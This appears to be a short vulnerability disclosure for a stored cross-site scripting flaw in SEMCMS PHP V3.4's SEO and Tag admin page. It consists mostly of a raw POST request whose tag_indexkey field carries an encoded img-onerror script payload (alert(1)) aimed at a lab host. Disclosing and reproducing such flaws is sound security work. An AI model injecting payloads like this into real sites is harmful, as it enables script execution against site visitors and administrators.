[SEMCMS](http://www.sem-cms.com/xiazai.html) PHP V3.4
1. Administrator management page：  
Visit the `http://192.168.66.129/s/b/SEMCMS_Main.php`, Click the Englist->SEO And Tag and edit.   
  
![](1.jpg)  
POST Request:  
```
POST /s/b/SEMCMS_SeoAndTag.php?Class=edit&CF=SeoAndTag HTTP/1.1
Host: 192.168.66.129
Content-Length: 3165
Cache-Control: max-age=0
Origin: http://192.168.66.129
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.66.129/s/b/SEMCMS_SeoAndTag.php?lgid=1&err=001
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=mimh8pchuhsp0sgd7sdqsbsav4; __atuvc=12%7C44; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b; __tins__4329483=%7B%22sid%22%3A%201540720933630%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201540722733630%7D; __51cke__=; __51laig__=1
Connection: close

tag_indexmetatit=Mobile+Phone+Case%2CLeather+case&tag_indexkey=Mobile+Phone+Case%2CLeather+case%22%3E%3Cimg+src%3D%27x%27+onerror%3Djavascript%3Aalert%281%29%3E&tag_indexdes=Mobile+Phone+Case%2CLeather+case%2CIpad+case+series%2CBluetooth%2CPhone+accessories&tag_prometatit=Leather+case&tag_prokey=iPad+mini&tag_prodes=iPad+mini&tag_newmetatit=News&tag_newkey=news&tag_newdes=news&tag_homeabout=We+main+manufacturer+and+supplier+of+all+the+phones+and+tablets+repair+parts+and+accessories+which+was+established+in+2007.+We+focus+on+exporting+qualified+LCD%2C+touch-screens%2C+flex+cables%2C+housings%2C+C.C%2C+keyboards%2C+batteries%2C+chargers%2C+speakers%2C+cell+phone+cases%2CTempered+screen+protectors+for+iPhone%2C+Samsung%2C+LG%2C+Motorola%2C+Nokia%2C+Sony%2C+Beetle%2C+BQ%2C+Lanix%2C+Blu%2C+Acer%2C+Airis%2C+B-Mobile%2C+Own%2C+etc.+%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E&tag_contacts=%3Ctable+style%3D%22width%3A100%25%3B%22+class%3D%22ke-zeroborder%22+cellspacing%3D%220%22+cellpadding%3D%222%22+border%3D%220%22%3E%0D%0A%09%3Ctbody%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09We+main+manufacturer+and+supplier+of+all+the+phones+and+tablets+repair+parts+and+accessories+which+was+established+in+2007.+We+focus+on+exporting+qualified+LCD%2C+touch-screens%2C+flex+cables%2C+housings%2C+C.C%2C+keyboards%2C+batteries%2C+chargers%2C+speakers%2C+cell+phone+cases%2CTempered+screen+protectors+for+iPhone%2C+Samsung%2C+LG%2C+Motorola%2C+Nokia%2C+Sony%2C+Beetle%2C+BQ%2C+Lanix%2C+Blu%2C+Acer%2C+Airis%2C+B-Mobile%2C+Own%2C+etc.%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%3C%2Ftbody%3E%0D%0A%3C%2Ftable%3E%0D%0A%3Ctable+style%3D%22width%3A100%25%3B%22+class%3D%22ke-zeroborder%22+cellspacing%3D%220%22+cellpadding%3D%222%22+border%3D%220%22%3E%0D%0A%09%3Ctbody%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09%3Cstrong%3ESEMCSM+LTD.%3C%2Fstrong%3E%3Cbr+%2F%3E%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%09%3Ctd+rowspan%3D%227%22+align%3D%22right%22%3E%0D%0A%09%09%09%09%3Cimg+src%3D%22%2Fsemcms%2FImages%2Fattached%2Fimage%2F20180818%2F20180818164650_89703.png%22+alt%3D%22%22+title%3D%22%22+width%3D%22400%22+height%3D%22261%22+align%3D%22%22+%2F%3E%3Cbr+%2F%3E%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09%26nbsp%3B+Phone+%3A+%2B86+15612345678%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09%26nbsp%3B+Skype+%3A+semcms%3Cbr+%2F%3E%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09%26nbsp%3B+Whatsapp+%3A+%2B86+15612345678%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09%26nbsp%3B+Address+%3A+Room+718%2CZhengyu+Mansion%2CNo.155%2CYian+Road%2CHaizhu+District%2CGuangzhou+City%2CChina%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%09%3Ctr%3E%0D%0A%09%09%09%3Ctd%3E%0D%0A%09%09%09%09%26nbsp%3B+Email+%3A+sales%40sem-cms.com%0D%0A%09%09%09%3C%2Ftd%3E%0D%0A%09%09%3C%2Ftr%3E%0D%0A%09%3C%2Ftbody%3E%0D%0A%3C%2Ftable%3E%0D%0A%3Cbr+%2F%3E&languageID=1&submit=%E7%BC%96%E8%BE%91
```
2. Go back to the home page and visit  
![](2.jpg)
  
![](3.jpg)